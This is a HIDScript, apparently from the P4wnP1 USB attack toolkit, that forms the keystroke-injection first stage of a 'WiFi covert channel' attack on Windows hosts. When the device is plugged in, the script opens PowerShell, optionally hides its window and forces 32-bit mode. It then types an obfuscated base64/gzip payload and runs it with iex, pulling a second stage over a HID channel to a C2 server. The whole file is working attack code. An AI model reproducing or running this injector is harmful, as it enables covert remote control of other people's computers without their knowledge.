/*
WiFi covert channel, initial stage (keystroke injection)
author: MaMe82

This isn't a stand-alone HIDScript. It is meant to be used as part of the Master Template "Wifi covert channel"
in order to met all the dependencies.

Two options could be changed in this script:
1) The keyboard language to type out the iniial stage
2) The hide option. If disabled the powershell window on the target host isn't hidden, to allow
easy debugging.

Dependencies:
	- this HIDScript is started as part of the TriggerActions named "wifi_covert_channel"
    and triggered as soon as a new USB to host connection is detected
    - the script runs stage1 (keystroke injection), stage 2 is delivered via a HID covert channel
    - to make the HID covert channel work:
    	a) the USB gadget needs to have 'Custom HID device' enabled in addition to keyboard
        b) the HID covert channel stager (hidstager.py) has to be started and ready to serve
        the stage2 PowerShell script
    - condition a) is assured by an USB gadget template, called 'wifi_covert_channel'
    - condition b) gets satisfied by a bash script (wifi_covert_channel.sh) bashscript, which 
    starts the stager and additionally the "WiFi covert channel C2 server"
    - the aforementioned bash script is started by a second trigger action, which is part
    TriggerActio templated named "wifi_covert_channel", too
    - so two conditions are assured by TriggerActions (starting HID stager+WiFi covert channel server
    and running this HIDScript against the target host), but the remaining condition (deploy proper USB
    gadget settings, once) has to be met, too.
    - To tie everything together, the TriggerAction template and the USB gadget settings have been wrapped
    together into a Master Template called 'wifi covert channel', which could be load on startup or on demand.
    
Controlling the server:
   - The WiFi covert channel server is bound to a screen session called 'wifi_c2' and could attached
   to a SSH session by running:
      $ screen -d -r wifi_c2
*/

language="us";
hide=false; // set to true to hide the console window on the target

// Hide an already opened PowerShell console, but keep input focus, to gon on typing
function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  	press("ENTER");
}

// On a powershell prompt, check if the running PS is 32bit, start an inline 32bit PowerShell, otherwise.
function assurePS32() {
  type("if ([IntPtr]::Size -ne 4){& $env:SystemRoot\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe}\n");
  delay(500);
}


// See helper.js for details
function hidDownAndIEX(vid, pid) {
  type("$USB_VID='"+ vid +"';$USB_PID='" + pid +"';");
  type("$b='H4sIAAAAAAAEAKVXbW/bNhD+PqD/QVC9WUZsQU7SLAhgbImdtAGa1qiTdZgjBLR0srlIpEFRbo0u/313JCXbaV2gaILEEnn33HOvpF/80rqbXDz8dT0a+P3RyYX/wi6MaSHqH/2OC1klEs2l8D5AlkOihwqYhiueww3ohUyDzotfvqBeKgtv4E3Pl8uRLBgX8dnZsFIKhLbvJMJQ4h186r2f/YtINSKCh+dlCcUsX79jBQT+DbuB08PRWtTLPhppsRmqk51wBBkXgPus4EktEyB+15tugV4WXDfIFxXPU1DnSQJlieQ+VIJACwPKZruYNzKt8m0idsHveq0rlpdAmtpoFrXm7XrZKKCcP65mOU+63jBnZWn4JxlFCPWchoufv4mov8vfCpxrrfis0lDGG9SJZponJH8t9FirGJ+IwTSOvT+D6QRVxDy220eH9HDXPG007vbveh1DOeWUVIyV5gWEuAdKLiegVhzDGI7y/LpYSqUbjnH4GvRQilKrKtFSBRsyFjBjBnDj5BWHPL0WmXTUf9CWUQ/8S6HVeiy50H6n+8OEHchYQYmSMOHzn0CZgH7LSn2plFQ/ATNkeY5hw1iusIcwUj+DtWAKafkuBdnKJMF2oQ37bhG2blUFzcdeo19RxLb6yAVb8u8pWS4oel5paQkl+weD6eFhVWpZNK65Vg6oPLtE/hGUgPzoMEzznMJEZWb+o6eu80K0+QwmMJZtK4fWf9PEuPK0Nfc2kcFCBlZcKVmMgJwZM70IWkWR5Oivq3KvtcRVNxMXZkLgPs7CBiUwEk1rRn8PI/tDS+9DEtkMKWDpR8U1bBrz7OwfjOdGFicT4OL7JYhNH0efj7dAtxXNICVaxOBCyhyYiCOK0WB6wxMlS5npELOI0ZywDN4wkeaYNnomc/b9eZuXQWcaxbXHCSZ9JR/RUxPdjA32O0Z0BkSmRSlzMTk53iLXt+Qcgs3Bt+z3j5GAAl0p8ZzCdjpLEOlDyjQLWhnioeFSViqhhxRKTR+4iR8KEuArSF0u+YCiNFvjHN4t1gtcmsZecPKqUwtMW/zgIKYeo9fYi/ZtONt7t4nR/k3kGb4FMdeLvTK1E+b0RfGhXK5vZWCl0UlOnFNYUShCk5BmD0vHPjobz+KIadiOo4uS+l5sEmUOcGeNSiBoqW7Utbs2wApoij3wlESV9QeXS5XsLqSlfiYhnqmoZLW7UJTzb7MjXWQwPVeKrenegkEiZhge/EM1GwwrVVcYMqJaMRWDO1QwycqK7wYKK3V7XLgLF0q6m5aL3Jvr0euKpwP/y3Hah1evZoe9rH+S9fr9JOudniazXhT18Yea+ih6opuZxBwkC+T/qeAYVY8Lb46PnuneB4THDtFK5jkoy8D779cvU5SIg9YDXkJwZKQ4uDtPXsdDCjxroEIrfz3yegXTZMOvifvegdf+DXk/tPHJr73wO14PR4O3F6CNDradUE9I3Ui6k8FQoOKg6Yh58u/v/7gnY7Xc+N24BsXaWeYsgaB93+62XyIsMnlphF0YTQqeNoD2hUYxQu+5yaIAiQ52M+bVjjcJ23QMYn3/dLDT354J1AASD0VU6tFMKzWbwyF5StduKJZ6/e3yjLBC8HZjyuTTgswGTRPtjmUMLHgtUeW5Lapm1jVd50X464xFxuHkEYhS086NqCsIK4HT3YBHFjjBwuKiAhPWbbH+frFWpbNTGk238FmHlyKRKR2YZ2d3t1enNM/tCdpAHccdh02KId54lS4/cuwhn9xaAL7PMPh15QUuvL25RvuWwAzdetyQ/ApoBnMutqFcM9aJwhBN6ZjBk4juNjQf3+LNHS95BOLZ6YqkPZtM385IwG8Ixl5NqAlInfQDHExEpjGFC/2vbQV+6CCf9hFxgOin/Z4DKWlw+Ow5W3YY4a0sz9fum5qrnWEuS3PbaVZGvFy6NVT6H8d3IaseDgAA';nal no New-Object -F;iex (no IO.StreamReader(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()");
  press("ENTER");
}

layout(language); //set keyboard layout according to the language variable (if this command is ommited, the current layout is used)
typingSpeed(0,0); // type as fast as possible

// The script is started, as soon as a USB  host connection is detected.
// A connection doesn't necessarily mean the remote host has the HID keyboard driver up already.
// To account for this, we wait for a keyboard report (no matter if it results in 'ANY_OR_NONE' LED state change
// we are only interested in an arriving LED report, which is sent by windows after keyboard driver initialization).
// After 5 seconds of waiting, we go on in any case.
//waitLED(ANY_OR_NONE, 5000); 

// start an unprivileged PowerShell console
press("GUI r");
delay(500);
type("powershell\n");
delay(500);

if (hide) { hidePS(); } //hide the console if choosen to do so
delay(500);
assurePS32(); // open a 32bit console, if the current one is 64bit
delay(500);
hidDownAndIEX("1D6B", "0137");
